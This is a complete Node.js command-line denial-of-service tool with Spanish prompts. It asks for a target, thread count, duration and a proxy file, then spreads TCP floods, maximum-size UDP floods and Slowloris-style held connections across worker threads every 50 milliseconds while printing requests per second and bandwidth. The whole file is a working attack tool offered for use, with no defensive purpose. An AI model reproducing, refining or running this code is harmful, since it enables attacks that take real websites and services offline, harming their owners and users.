#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');
const fs = require('fs');

class DDOSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'SLOWLORIS'];
        this.proxies = [];
    }

    async start() {
        const target = await this.ask(chalk.greenBright('Objetivo (URL/IP): '));
        const { hostname, port } = await this.parseTarget(target);
        const threads = await this.numberBetween(chalk.greenBright('Hilos (100-1000): '), 100, 1000);
        const duration = await this.numberBetween(chalk.greenBright('Duración (segundos): '), 10, 3600);
        const useProxies = await this.ask(chalk.greenBright('¿Usar proxies (Sí/No)? '));

        if (useProxies.toLowerCase() === 'sí') await this.loadProxies();

        this.startTime = performance.now();
        this.startWorkers(hostname, port, threads);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async loadProxies() {
        const proxyFile = await this.ask(chalk.greenBright('Archivo de proxies (formato IP:PUERTO): '));
        try {
            this.proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
            console.log(chalk.green('Proxies cargados correctamente.'));
        } catch (error) {
            console.error(chalk.red('Error al cargar proxies.'));
            process.exit(1);
        }
    }

    async parseTarget(input) {
        try {
            if (net.isIP(input)) return { hostname: input, port: 80 };
            if (!input.includes('://')) input = 'http://' + input;

            const urlObj = new url.URL(input);
            const dnsResolved = await dns.lookup(urlObj.hostname);

            return {
                hostname: dnsResolved.address,
                port: urlObj.port || 80
            };
        } catch (error) {
            console.error(chalk.red('\nError: Objetivo inválido'));
            process.exit(1);
        }
    }

    startWorkers(target, port, threads) {
        const cores = Math.min(require('os').cpus().length, 16);
        const payloads = this.generatePayloads(target);

        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    target,
                    port,
                    payloads,
                    methods: this.methods,
                    intensity: Math.ceil(threads / cores),
                    proxies: this.proxies
                }
            });

            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    generatePayloads(target) {
        const createPayload = size => {
            const buf = Buffer.alloc(size);
            randomFillSync(buf);
            return buf;
        };

        return {
            tcp: createPayload(1024),
            udp: createPayload(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${target}\r\n\r\n`
        };
    }

    updateStats({ total, success, failed, bandwidth }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.failed += failed;
        this.stats.bandwidth += bandwidth;
    }

    showStats() {
        if (!this.startTime) return;

        const elapsed = (performance.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);

        process.stdout.write(
            chalk`\r{cyan [${elapsed.toFixed(1)}s]} ` +
            chalk`{white Peticiones:} {cyan ${this.stats.total}} ` +
            chalk`{green Éxito:} {cyan ${this.stats.success}} ` +
            chalk`{red Fallo:} {cyan ${this.stats.failed}} ` +
            chalk`{yellow RPS:} {cyan ${rps}} ` +
            chalk`{magenta BW:} {cyan ${bw}GB}`
        );

        setTimeout(() => this.showStats(), 250);
    }

    async ask(question) {
        return new Promise(resolve => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            rl.question(question, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.red('\n\nAtaque detenido'));
        process.exit();
    }
}

if (isMainThread) {
    new DDOSAttack().start();
} else {
    const { target, port, payloads, methods, intensity, proxies } = workerData;
    const activeConnections = new Set();

    const attackMethods = {
        TCP: () => {
            const socket = net.connect(port, target);
            socket.setTimeout(5000);
            
            socket.on('connect', () => {
                socket.write(payloads.tcp);
                parentPort.postMessage({ total: 1, success: 1, failed: 0, bandwidth: payloads.tcp.length });
                socket.destroy();
            });
            
            socket.on('error', () => {
                parentPort.postMessage({ total: 1, success: 0, failed: 1, bandwidth: 0 });
            });
        },

        UDP: () => {
            const socket = dgram.createSocket('udp4');
            const message = payloads.udp;
            
            socket.send(message, port, target, (err) => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: err ? 0 : 1, 
                    failed: err ? 1 : 0, 
                    bandwidth: err ? 0 : message.length 
                });
                socket.close();
            });
        },

        SLOWLORIS: () => {
            const socket = net.connect(port, target);
            socket.setTimeout(10000);
            
            socket.on('connect', () => {
                socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`);
                socket.write(`User-Agent: ${randomBytes(8).toString('hex')}\r\n`);
                socket.write(`Connection: keep-alive\r\n\r\n`);
                activeConnections.add(socket);
            });
            
            socket.on('error', () => {
                activeConnections.delete(socket);
                parentPort.postMessage({ total: 1, success: 0, failed: 1, bandwidth: 0 });
            });
        }
    };

    const attack = () => {
        for (let i = 0; i < intensity * 2; i++) {
            const method = methods[Math.floor(Math.random() * methods.length)];
            attackMethods[method]();
        }
        setTimeout(attack, 50);
    };
    
    attack();
}